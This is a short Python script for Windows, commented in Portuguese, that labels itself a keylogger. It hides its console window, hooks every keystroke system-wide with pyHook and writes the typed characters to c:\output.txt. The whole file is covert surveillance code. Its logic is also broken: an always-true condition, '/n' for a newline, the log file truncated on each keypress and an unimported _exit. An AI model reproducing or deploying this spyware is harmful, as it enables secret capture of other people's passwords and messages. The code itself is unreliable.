# código Python: keylogger
# Feito para Windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook
  
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
  
def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #abre output.txt para ler as keystrokes no momento de digitação
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
    # abre output.txt para escrever as keystrokes que foram digitadas/que iram ser digitadas
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
            buffer += keylogs   
            f.write(buffer)
            f.close()
# cria um hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# configura o hook
hm.HookKeyboard()
# roda pra sempre
pythoncom.PumpMessages()